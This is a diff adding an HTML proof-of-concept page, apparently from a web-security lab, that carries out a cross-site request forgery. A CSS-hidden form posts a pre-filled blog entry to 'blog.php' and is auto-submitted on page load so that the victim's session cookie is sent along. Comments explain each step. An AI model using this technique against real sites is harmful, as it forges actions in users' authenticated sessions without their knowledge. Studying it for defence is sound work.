@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+
+    <!-- Hide the form from the user -->
+    <style>
+        form { display: none; }
+    </style>
+</head>
+<body>
+    <h2>This page performs a CSRF attack</h2>
+
+    <!--
+        This is a malicious form.
+        It mimics a legitimate blog post submission and targets the victim’s server.
+        The input field is pre-filled with a fake blog post.
+    -->
+    <form id="attackForm" action="blog.php" method="POST">
+        <input type="hidden" name="content" value="Automatically posted by CSRF via session cookie!">
+    </form>
+
+    <script>
+        /**
+         * Automatically submit the hidden form when the page loads.
+         * The attack relies on the fact that the browser will automatically include
+         * any existing session cookie with this POST request.
+         *
+         * The attacker does not need to read or manipulate the cookie
+         * they simply trigger the request.
+         */
+        window.onload = function() {
+            console.log("CSRF attack triggered. Form auto-submitted.");
+            document.getElementById("attackForm").submit();
+        };
+    </script>
+</body>
+</html>
